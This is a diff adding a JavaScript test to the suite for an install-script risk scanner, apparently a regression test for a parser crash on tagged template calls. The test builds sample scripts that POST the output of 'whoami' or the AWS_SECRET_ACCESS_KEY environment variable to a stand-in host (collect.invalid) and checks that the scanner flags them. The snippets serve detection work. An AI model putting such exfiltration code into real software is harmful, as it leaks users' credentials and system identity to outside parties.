@@ -375,3 +375,20 @@ test("unknown self reads and failed Python retain raw addresses (D-22 v3)", () =
     assert.ok(installScriptRisk(text, true, false, lang).includes("contacts an address typical of data exfiltration (http://203.0.113.9)"), text);
   }
 });
+
+test("a tagged template call of a script's wrapper reads the template, never a list (PANIC-TAGGED)", () => {
+  // Twin of test_exfiltration_shapes.py's TaggedTemplateWrapperTests: the engine panicked (and the WASM build aborts)
+  // on a tagged template call of a wrapper once the tree held more nodes than list slots (@epoch32/visage 1.14.0).
+  const pad = "0;\n".repeat(3000);
+  const exec = "const { execSync } = require('child_process');\n" +
+    "function run(c) { try { return execSync(String(c)).toString(); } catch { return ''; } }\n";
+  const env = "function getEnv(n) { return process.env[n]; }\n";
+  const post = (v) => `fetch('https://collect.invalid/c', { method: 'POST', body: ${v} });\n`;
+  const risk = (text) => installScriptRisk(pad + text, true, false, "js");
+  assert.deepEqual(risk(exec + post("run`whoami`")), ["sends the machine's user or host name over the network"]);
+  assert.deepEqual(risk(env + post("getEnv`AWS_SECRET_ACCESS_KEY`")),
+    ["sends environment variables over the network (AWS_SECRET_ACCESS_KEY)"]);
+  assert.deepEqual(risk(exec + "const w = 'who';\n" + post("run`${w}ami`")), []);
+  assert.deepEqual(risk(env + post("getEnv`HOST`")), []);
+  assert.deepEqual(risk(exec + post("run('whoami')")), ["sends the machine's user or host name over the network"]);
+});
